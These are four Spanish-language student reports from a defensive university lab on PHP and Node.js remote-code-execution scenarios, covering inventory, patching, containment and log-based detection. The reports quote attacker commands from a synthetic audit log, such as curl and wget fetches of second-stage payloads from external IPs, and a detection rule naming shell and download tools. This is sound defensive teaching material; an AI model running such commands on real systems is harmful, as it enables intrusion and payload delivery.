# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Ulises Mateo Bucchino_
**Usuario de GitHub:** _ulisesutnfrlp7_
**Rol en el TP:** _cambios-parche_
**Fecha:** 29/10/2026
**Grupo:** 08

---

## 1. Situación y riesgo

Durante el laboratorio defensivo se identificaron tres servicios vulnerables en una red aislada (`labnet`, `internal: true`):

| Servicio | Versión inicial | Hallazgo principal | Riesgo |
|----------|----------------|--------------------|--------|
| Portal PHP | PHP 8.3.35 (cli, NTS) | `session.upload_progress.enabled = 1` habilitado | RCE mediante técnica conocida en PHP < 8.3.36 |
| API Node.js | Node v22.23.3 | brotli 1.1.0 aportado por el runtime | Dependencia desactualizada; posible vector secundario |
| Servicio Python | Python 3.11.18 | brotli 1.0.9 | Dependencia desactualizada |

El activo más crítico es el Portal PHP: la función de progreso de subida de sesiones puede ser abusada para ejecución remota de código (RCE) en versiones anteriores a 8.3.36. Como los contenedores no publican puertos y operan sobre red interna sin salida a Internet, la exposición real es limitada, pero el riesgo de movimiento lateral dentro del laboratorio es real si un atacante logra compromiso inicial.

## 2. Plan priorizado

Se aplicó la siguiente priorización (matriz en `entrega.md`, sección 2):

1. **Portal PHP (Alta):** Mitigación inmediata (`session.upload_progress.enabled = 0` en `laboratorio/php/php.ini`, reinicio de `php-lab`, verificación con `ini_get()` → `0`). Parche de versión a PHP 8.3.36 mediante `./scripts/parchear.sh`.
2. **API Node.js (Media):** Parche a Node v22.23.4 con `./scripts/parchear.sh`. Revisar dependencias con brotli.
3. **Servicio Python (Media):** Actualización a Python 3.11.18 con brotli 1.2.1 mediante `./scripts/parchear.sh`.

**Reversión documentada:** `git revert 524c95f` (commit que puso la directiva en `0`) y volver a tags anteriores con `PHP_TAG`/`NODE_TAG` en `versions.env`.

## 3. Indicadores de compromiso (IoC)

A partir de `audit.log` y `./scripts/detectar.sh`, se identificaron los siguientes hallazgos de caza:

| Timestamp | Host | Padre → hijo | Comando sospechoso | Estado |
|-----------|------|--------------|-------------------|--------|
| 2026-10-27T09:42:17Z | web01 | apache2 → sh | `sh -c id` | Compromiso |
| 2026-10-27T09:43:03Z | api01 | node → sh | `sh -c curl http://198.51.100.7/x` | Compromiso |
| 2026-10-27T09:44:22Z | web01 | apache2 → wget | `wget http://198.51.100.9/a` | Compromiso |
| 2026-10-27T09:45:10Z | svc01 | python → sh | `sh -c uname -a` | Compromiso |

**Regla de detección propuesta (Node.js):** alerta cuando `ppid_comm = node` y `comm ∈ {sh, bash, curl, wget}`. Falso negativo posible si el atacante usa `child_process.exec` sin spawn de shell visible.

**Limitaciones:** el log no registra usuario de origen del atacante ni IP de origen; solo IPs destino (`198.51.100.7`, `198.51.100.9`).

## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)

Supongamos una vulnerabilidad hipotética **CVE-2026-115560** en un motor de plantillas de Node.js que permite inyección de comandos mediante cabeceras HTTP maliciosas.

- **Similitud con el TP:** al igual que `session.upload_progress.enabled = 1` en PHP, CVE-2026-115560 expone una funcionalidad legítima (procesamiento de plantillas) que puede ser abusada para ejecución remota.
- **Diferencia:** en el TP la mitigación fue deshabilitar una opción de configuración (`session.upload_progress.enabled = 0`); en CVE-2026-115560 la mitigación sería actualizar el motor de plantillas a una versión parcheada y validar/sanitizar cabeceras de entrada.
- **Lección transferible:** en ambos casos, la mitigación de configuración (deshabilitar función innecesaria) es un control inmediato mientras se espera el parche de versión.

## 5. Lecciones aprendidas

1. **Mitigación antes del parche:** deshabilitar una opción de configuración riesgosa (`session.upload_progress.enabled`) reduce el riesgo inmediatamente, sin esperar la ventana de cambio del viernes.
2. **Contención en profundidad:** `internal: true`, `read_only`, `cap_drop: ALL`, usuarios sin privilegios y límites de memoria/PIDs forman capas independientes que limitan el daño incluso si un servicio es comprometido.
3. **Detección sin contexto completo:** los logs de procesos revelan comportamiento anómalo (padre→hijo), pero carecen de usuario/IP de origen; se necesitan múltiples fuentes de telemetría para investigación forense completa.
4. **Documentación como evidencia:** pegar outputs de comandos (`inventario.sh`, `parchear.sh`, `detectar.sh`, `verificar-contencion.sh`) directamente en los entregables evita reconstrucciones imprecisas al final del TP.
5. **Comunicación con gerencia:** hay que traducir riesgos técnicos a impacto de negocio (disponibilidad, confidencialidad) sin dar detalles que ayuden a un atacante.

## 6. Qué no se pudo probar

- Acceso real desde red externa al laboratorio (no hay salida a Internet ni proxy público en el entorno aislado).
- Explotación activa de las vulnerabilidades (el TP prohíbe exploits/PoCs; solo se trabajó con contenedores de la cátedra).

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Valentín Garzaniti_
**Usuario de GitHub:** _Vgarzaniti_
**Rol en el TP:** _contencion-comunicacion_
**Fecha:** 29/10/2026
**Grupo:** 08

---

## 1. Situación y riesgo

En el relevamiento del laboratorio se evaluaron tres servicios desplegados en la red interna `labnet` (`internal: true`, sin puertos publicados al host):

| Servicio | Versión inicial | Hallazgo principal | Riesgo |
|----------|----------------|--------------------|--------|
| Portal PHP (`php-lab`) | PHP 8.3.35 | `session.upload_progress.enabled = 1` activo en versión previa a 8.3.36 | Alto — RCE sin autenticación con explotación real confirmada (CISA KEV) |
| API Node.js (`node-lab`) | Node v22.23.3 | Decoder brotli 1.1.0 embebido en el runtime (endpoint `/decode`) | Medio — Vulnerable a CVE-2026-111497, sin explotación activa confirmada |
| Servicio Python (`py-lab`) | Python 3.11.18 | Paquete `brotli` 1.0.9 desactualizado | Medio — Vulnerable a CVE-2026-111497 en servicio interno |

El riesgo más alto recae sobre el Portal PHP (`php-lab`), ya que combina versiones previas a 8.3.36 con `session.upload_progress.enabled = 1`. Aunque en el escenario actual los contenedores no están publicados a Internet, un compromiso inicial o un cambio en el despliegue (por ejemplo, agregar un proxy inverso) permitiría ejecutar comandos en el contenedor y pivotar dentro de la red interna hacia `node-lab` y `py-lab`.

## 2. Plan priorizado

Se ejecutó un plan en tres pasos, priorizando la reducción inmediata de superficie y la verificación de contención antes del parcheo definitivo:

| Acción | Activo | Plazo | Dueño | Reversión |
|--------|--------|-------|-------|-----------|
| 1. Mitigación en configuración (`session.upload_progress.enabled = 0` en `php.ini` y reinicio) | Portal PHP (`php-lab`) | Inmediato (primeros 15 min) | Cambios / Parche | `git revert 524c95f` (vuelve la directiva a `1`) y `docker compose restart php-lab` |
| 2. Verificación de controles de contención (`./scripts/verificar-contencion.sh`) | `php-lab`, `node-lab`, `py-lab` | Inmediato (primeros 30 min) | Contención / Comunicación | Ajustar directiva en `docker-compose.yml` y recrear el servicio |
| 3. Parcheo de versiones a PHP 8.3.36, Node v22.23.4 y brotli 1.2.1 (`./scripts/parchear.sh`) | `php-lab`, `node-lab`, `py-lab` | En el día | Cambios / Parche | Volver a tags anteriores con `PHP_TAG` / `NODE_TAG` en `versions.env` y `docker compose up` |

**Justificación:** si un parche de proveedor demorara hasta una ventana de cambio posterior, la mitigación en `php.ini` junto con los controles de contención (`internal: true`, `read_only: true`, `cap_drop: ALL` y límites de recursos) reducen de inmediato el impacto potencial sin interrumpir el servicio.

## 3. Indicadores de compromiso (IoC)

Del análisis de `laboratorio/logs/audit.log` y `./scripts/detectar.sh` surgen señales claras de ejecución anómala en los tres servicios de aplicación, diferenciadas de actividad administrativa normal:

| Timestamp | Host | Padre → hijo | Comando observado | Evaluación |
|-----------|------|--------------|-------------------|------------|
| 2026-10-27T09:42:17Z | web01 | apache2 → sh | `sh -c id` | Compromiso (worker web lanzando shell) |
| 2026-10-27T09:42:40Z | db01 | sshd → bash | `-bash` | Posible falso positivo (sesión SSH administrativa) |
| 2026-10-27T09:43:03Z | api01 | node → sh | `sh -c curl http://198.51.100.7/x` | Compromiso (intento de descarga externa) |
| 2026-10-27T09:44:22Z | web01 | apache2 → wget | `wget http://198.51.100.9/a` | Compromiso (intento de descarga externa) |
| 2026-10-27T09:45:10Z | svc01 | python → sh | `sh -c uname -a` | Compromiso (reconocimiento local) |

**Qué confirma o descarta el incidente:** que `apache2`, `node` o `python` ejecuten `sh`, `curl` o `wget` confirma ejecución de comandos. En cambio, la verificación de contención (`SIN SALIDA` en los tres contenedores) permite confirmar a gerencia que los intentos de descargar etapas adicionales desde `198.51.100.7` y `198.51.100.9` quedan bloqueados por la red `internal: true`.

**Limitaciones del log:** `audit.log` no informa qué usuario ejecutó el proceso, qué IP originó la petición HTTP ni el resultado de red del comando ejecutado.

## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)

Frente a una vulnerabilidad nueva como **CVE-2026-115560** (por ejemplo, un defecto adicional en el manejo de sesiones o subida de archivos en PHP o en un componente de decodificación HTTP):

- **Qué evaluar primero:** identificar mediante inventario automatizado qué activos tienen habilitada la directiva o dependencia afectada y si reciben tráfico no confiable.
- **Cómo priorizar y contener:** aun cuando el parche oficial no esté disponible el primer día, se aplica primero el control de configuración (deshabilitar la función no esencial o rechazar cabeceras como `Content-Encoding: br` en el borde) y se verifica que el contenedor mantenga `read_only: true`, `cap_drop: ALL` y red sin salida a Internet.
- **Qué cambia en el plan:** con la contención verificada de antemano, la comunicación al comité de crisis pasa de una parada de emergencia a una ventana de cambio programada con riesgo acotado y prueba de reversión lista.

## 5. Lecciones aprendidas

1. **Contención como red de seguridad real:** cuando un servicio sufre ejecución remota (`curl`/`wget` en `audit.log`), el bloqueo de salida (`internal: true`) y el filesystem en solo lectura (`read_only: true`) cortan la cadena de ataque antes de que descargue herramientas o persista en disco.
2. **Mitigar en minutos, parchear con verificación:** deshabilitar `session.upload_progress.enabled` en `php.ini` neutraliza el vector principal mientras se reconstruyen y validan las imágenes con `./scripts/parchear.sh`.
3. **Reducir superficie innecesaria:** si un servicio interno no necesita recibir cuerpos comprimidos con Brotli, rechazar `Content-Encoding: br` evita exponer el decoder de `node-lab` y `py-lab`.
4. **Separar ruido de hallazgos reales:** distinguir un `sshd → bash` en `db01` de un `apache2 → sh` en `web01` evita falsas alarmas durante la respuesta al incidente.
5. **Comunicación ejecutiva clara:** a gerencia se le informa impacto, estado de contención comprobado (`SIN SALIDA`), ventana de parcheo y plan de vuelta atrás, sin exponer detalles técnicos innecesarios hacia afuera.

## 6. Qué no se pudo probar

- Acceso real desde red externa al laboratorio (no hay salida a Internet ni proxy público en el entorno aislado).
- Explotación activa de las vulnerabilidades (el TP es estrictamente defensivo y se trabajó únicamente sobre los contenedores provistos por la cátedra).

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Jano Stratakis_
**Usuario de GitHub:** _janostra_
**Rol en el TP:** _Detección_
**Fecha:** 29/10/2026
**Grupo:** 08

---

## 1. Situación y riesgo

El laboratorio tiene tres servicios (`php-lab`, `node-lab`, `py-lab`) en la red interna `labnet`, sin puertos publicados. Desde detección, la pregunta no es solo qué versiones son vulnerables sino si ya hubo explotación. El `audit.log` (sintético, 27/10/2026, 09:40Z–09:49Z) muestra que sí hubo ejecución de comandos en `web01`, `api01` y `svc01`: procesos de aplicación (`apache2`, `node`, `python`) lanzando `sh`, `curl` y `wget`. Esto es consistente con PHP2Shell (PHP 8.3.35 con `session.upload_progress.enabled=1`) y con la explotación de Brotli (CVE-2026-111497) en Node y Python.

Riesgo: alto para `web01` (RCE con descargas externas) y medio para `api01` y `svc01`. La exposición directa a Internet es limitada por el diseño del laboratorio, pero el log indica que el atacante ya tuvo ejecución dentro de los contenedores.

## 2. Plan priorizado

| Prioridad | Acción | Evidencia |
|---|---|---|
| 1 | Confirmar el alcance: correr `./scripts/detectar.sh` y revisar el log completo, incluyendo hijos de segundo nivel (`id`, `uname`) que el script no muestra. | Salida del script y líneas L6, L9, L14, L16 de `audit.log`. |
| 2 | Contener antes de investigar más: verificar `SIN SALIDA` con `./scripts/verificar-contencion.sh` para que `198.51.100.7` y `198.51.100.9` no puedan servir una segunda etapa. | Salida del script (sección 5 de `entrega.md`). |
| 3 | Parchear y mitigar (`session.upload_progress.enabled=0`, PHP 8.3.36, Node 22.23.4, brotli 1.2.1) y volver a revisar el log y `docker top` después del cambio. | `parchear.sh` y `entrega.md` sección 3. |
| 4 | Dejar una regla permanente sobre Node.js (`ppid_comm=node` y `comm` en `sh`, `bash`, `curl`, `wget`, `nc`). | `deteccion.md` sección 4. |

## 3. Indicadores de compromiso (IoC)

| Línea / timestamp | Host | Padre → hijo | Evaluación |
|---|---|---|---|
| L6 · 09:42:17Z | web01 | `apache2` → `sh -c id` | Compromiso: un worker web ejecuta un shell y reconocimiento. |
| L9 · 09:43:03Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` | Compromiso: intento de descarga de segunda etapa. |
| L14 · 09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | Compromiso: descarga desde otra IP externa. |
| L16 · 09:45:10Z | svc01 | `python` → `sh -c uname -a` | Compromiso: reconocimiento del sistema. |
| L8, L13, L21 | db01 | `sshd` → `bash` | Probable falso positivo: sesión SSH administrativa, sin usuario ni IP en el log para confirmarlo. |

**Conclusión de la caza:** hay compromiso en tres hosts de aplicación. Está **indeterminado** si las descargas se completaron, porque el log no registra el resultado de red. Que la red sea `internal: true` indica que en el laboratorio no habrían salido, pero eso sale de la configuración y no del log.

**Regla propuesta para Node.js:** alertar cuando `ppid_comm=node` y `comm ∈ {sh, bash, curl, wget, nc}`. Falso negativo: ejecución dentro del propio proceso `node` (sin crear hijo) o uso de otros binarios (`python`, `perl`, `socat`).

**Limitaciones del log:** no tiene usuario, IP de origen ni resultado de los comandos; cubre solo ~10 minutos; sin telemetría de red ni de archivos. Además, `detectar.sh` solo muestra hijos directos de las apps, por lo que oculta `id` y `uname` (hijos de `sh`).

## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)

Ante una CVE nueva en un componente que no conocemos, desde detección haría lo siguiente:

- **Antes de que exista parche:** definir qué comportamiento sería la huella de la explotación. En este TP fue "proceso de aplicación que lanza un shell"; para un motor de plantillas con inyección de comandos sería el mismo patrón, o `node` conectando a IPs externas inesperadas.
- **Reutilizar la regla:** la regla `ppid_comm → comm` sirve sin cambios porque no depende de la CVE sino de lo que hace el atacante después. Lo que habría que ajustar es la lista de binarios y los falsos negativos.
- **Qué cambia:** si la CVE no genera procesos hijo (por ejemplo, ejecución en memoria), la regla no ve nada y haría falta telemetría de red o de llamadas al sistema. Es el límite principal de lo que aprendimos en este TP.

## 5. Lecciones aprendidas

1. **Detectar no reemplaza a parchear, y parchear no reemplaza a detectar.** El inventario dice qué es vulnerable; el log dice si ya pasó algo. Hacen falta ambos.
2. **Mirar el árbol completo, no solo el primer nivel.** `detectar.sh` filtra por padre de aplicación y deja afuera `id` y `uname`, que prueban que el shell se usó.
3. **Separar ruido de hallazgos.** `sshd → bash` en `db01` coincide con el patrón de shell, pero no es lo mismo que `apache2 → sh`; el padre importa.
4. **Un log sin usuario, IP de origen ni resultado no permite atribuir ni medir el daño.** Hay que declararlo como limitación y no afirmar más de lo que muestra.
5. **La contención compra tiempo para investigar.** Con `SIN SALIDA` verificado, la incertidumbre sobre si las descargas funcionaron deja de ser crítica mientras se completa el análisis.

## 6. Qué no se pudo probar

- Si las descargas de `198.51.100.7` y `198.51.100.9` llegaron a completarse (el log no registra el resultado).
- La causa de entrada del atacante (qué petición disparó la ejecución): no hay logs HTTP ni IP de origen.
- Que el `audit.log` sintético corresponda a los contenedores reales del laboratorio: es un archivo provisto por la cátedra.
- Explotación activa de las vulnerabilidades, que no se realizó porque el TP es estrictamente defensivo.
- Que la regla de Node.js dispare en un entorno real: se razonó sobre el log pero no se probó en un motor de detección.

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Sofia Raggi_ 
**Usuario de GitHub:** _71l0_
**Rol en el TP:** _Inventario_
**Fecha:** 28/10/2026
**Grupo:** 08

## 1. Situación y riesgo

En la primera parte de la experiencia se realizó el inventario inicial de los tres servicios desplegados en Docker: un portal PHP, una API Node.js y un servicio Python. El objetivo fue identificar las versiones instaladas, las dependencias relevantes y las condiciones de exposición para aportar información verificable a la evaluación de riesgos del equipo.

El análisis se basa en dos incidentes de seguridad: PHP2Shell (CVE-2026-109618 y CVE-2026-109619), relacionado con ejecución remota de código en PHP, y Node2Shell / HTTP2Shell (CVE-2026-111497), asociado a una escritura fuera de límites en el decoder Brotli.

El inventario inicial obtenido mediante `./scripts/inventario.sh` registró los siguientes resultados:

| Activo | Versión inicial | Hallazgo principal | Evaluación inicial |
|---|---|---|---|
| Portal PHP (`php-lab`) | PHP 8.3.35 | `session.upload_progress.enabled = 1` | Prioridad alta de revisión y mitigación |
| API Node.js (`node-lab`) | Node.js 22.23.3 | Brotli 1.1.0 aportado por el runtime | Requiere actualización y validación del decoder |
| Servicio Python (`py-lab`) | Python 3.11.18 | Paquete Brotli 1.0.9 | Requiere verificar la dependencia y actualizarla |

La evidencia complementaria obtenida con `docker ps --format "table {{.Names}}\t{{.Ports}}"` mostró los puertos internos 80/tcp, 3000/tcp y 8000/tcp, sin publicaciones explícitas en el host, indicando asi, que los servicios no están publicados a Internet y que el laboratorio utiliza una red interna aislada.

Este supuesto limita la exposición directa, pero se tiene que considerar que no elimina la vulnerabilidad de los componentes ni los riesgos asociados con un eventual compromiso desde otro servicio de la red. Además, tambien se debe reevaluar si se incorpora un proxy inverso, se publican puertos o cambia la arquitectura.

Por esta razon, la principal conclusión de esta etapa es que el inventario permite **identificar componentes que requieren atención prioritaria y establecer una línea de base para comprobar posteriormente las mitigaciones y actualizaciones**.

## 2. Plan priorizado	

A partir de los hallazgos, se propuso organizar la respuesta en tres niveles de intervención:

| Prioridad | Activo | Acción propuesta | Evidencia requerida |
|---|---|---|---|
| Alta | Portal PHP | Deshabilitar temporalmente `session.upload_progress.enabled` si corresponde al escenario vulnerable y actualizar PHP a una versión corregida | Configuración anterior y posterior, versión final y verificación de la directiva |
| Media | API Node.js | Actualizar Node.js a una versión corregida y revisar el uso de Brotli | Versión del runtime y resultado de las pruebas posteriores |
| Media | Servicio Python | Verificar el paquete Brotli y actualizarlo a una versión corregida compatible | Versión del paquete antes y después y comprobación de la dependencia utilizada |

Las prioridades indicadas son iniciales y deben validarse con la matriz de riesgo del grupo y los avisos oficiales de los proveedores. En particular, no debe confundirse la versión del runtime con la versión de una dependencia que pueda estar incorporada en él.

_Para PHP se identificó la versión **8.3.35**, que debe contrastarse con la versión correctiva indicada en el aviso oficial. Para Node.js se registró la versión **22.23.3**, mientras que para Python se detectó Brotli **1.0.9**. La actualización definitiva debe comprobarse mediante el inventario posterior al cambio, no únicamente por la ejecución satisfactoria del script de parcheo._

El objetivo principal consiste en: **mantener actualizados los datos de los activos, registrar las versiones iniciales y finales y aportar evidencia para que el equipo determine si las acciones implementadas resolvieron la exposición al componente vulnerable**.

Toda modificación se deberá documentar el estado anterior y posterior, los comandos ejecutados, las evidencias obtenidas y el procedimiento de reversión. 

## 3. Indicadores de compromiso	

El inventario de versiones debe complementarse con el análisis de registros para determinar si los componentes identificados presentan alguna actividad anómala. En este sentido, los registros de procesos pueden aportar información clave sobre la ejecución de comandos por parte de servicios web y aplicaciones.

Entre los patrones que deben investigarse se encuentran:

- Procesos de servidores web que generan shells, como `apache2 → sh`.
- Procesos de Node.js que generan shells o herramientas de descarga.
- Procesos de Python que ejecutan comandos del sistema sin una justificación operativa.
- Intentos de descarga de archivos desde direcciones externas.

Desde la perspectiva del inventario, **la correlación entre los activos, las versiones y los hallazgos de detección permiten establecer qué servicio requiere investigación prioritaria**. Sin embargo, el inventario no confirma por sí mismo que haya existido explotación.

Entre las limitaciones que deben documentarse se encuentran la _ausencia de información sobre el usuario de origen, la falta de una IP de origen de la petición HTTP y la imposibilidad de determinar el resultado de una operación de red_ únicamente a partir de ciertos registros de procesos.

## 4. Transferencia

Como ejemplo de transferencia, se considera la **vulnerabilidad hipotética CVE-2026-115560**, la cual corresponde a un defecto en un motor de plantillas de Node.js que permitiría inyección de comandos mediante cabeceras HTTP manipuladas. Este escenario es ilustrativo y no se presenta como un aviso de seguridad verificado.

La **primera medida** sería identificar los activos que utilizan el motor de plantillas afectado y registrar su versión. Seguido, se debería determinar si las aplicaciones reciben cabeceras controladas por usuarios o sistemas externos y si esas entradas llegan al componente vulnerable.

La priorización seria a partir de la criticidad del activo, la versión instalada, la exposición de la aplicación y la posibilidad de reducir el riesgo mediante configuración. Si existiera el caso de una mitigación temporal segura, se podría aplicar mientras se prepara la actualización definitiva.

Lo que se debe entender de este caso, es que un inventario actualizado permite responder con mayor rapidez ante nuevas vulnerabilidades y facilita el verificar que las medidas correctivas se hayan aplicado efectivamente.

## 5. Lecciones aprendidas

1. **El inventario es la base de la respuesta a incidentes.** El registrar los componentes, las versiones y las dependencias permite identificar los activos que requieren intervención y evita tomar decisiones basadas únicamente en suposiciones.

2. **La exposición y la vulnerabilidad son condiciones diferentes.** Que los contenedores no publiquen puertos a Internet reduce la exposición directa, pero no elimina la necesidad de corregir componentes vulnerables.

3. **Las versiones deben verificarse después del parcheo.** La ejecución de un script no garantiza del todo que el componente vulnerable haya sido actualizado, por lo tanto es necesario obtener evidencia posterior al cambio.

4. **La información debe ser trazable.** Registrar comandos, resultados, configuraciones y fuentes oficiales para facilitar la revisión de lo realizado.

5. **Los resultados negativos y las limitaciones también importan.** Si no se pudo verificar un endpoint, una ruta de acceso o una condición de procesamiento, debe quedar expresamente documentado.

6. **La comunicación debe centrarse en el impacto.** Para gerencia, los resultados del inventario deben traducirse en decisiones: qué activos requieren atención, qué medidas se recomiendan y qué incertidumbres continúan pendientes.

## 6. Qué no se pudo probar

El inventario inicial permitió registrar las versiones de los runtimes y de Brotli, además de identificar la ausencia de publicaciones explícitas de puertos en la salida de Docker. Pero, estas evidencias no permiten afirmar por sí solas que se hayan descartado todas las vías de acceso externo.

Por lo tanto, en las siguientes comprobaciones se debe considerar confirmar:

- La inexistencia de un proxy inverso u otra ruta de exposición externa, más allá del supuesto establecido por la consigna.
- El procesamiento efectivo de contenido no confiable en cada aplicación.
- La explotación activa de las vulnerabilidades, que no se realizó porque la práctica es estrictamente defensiva.
- La corrección definitiva de todos los componentes, hasta contar con el inventario posterior al parcheo.
- La ausencia total de compromiso, que requiere revisar los registros y otras evidencias disponibles.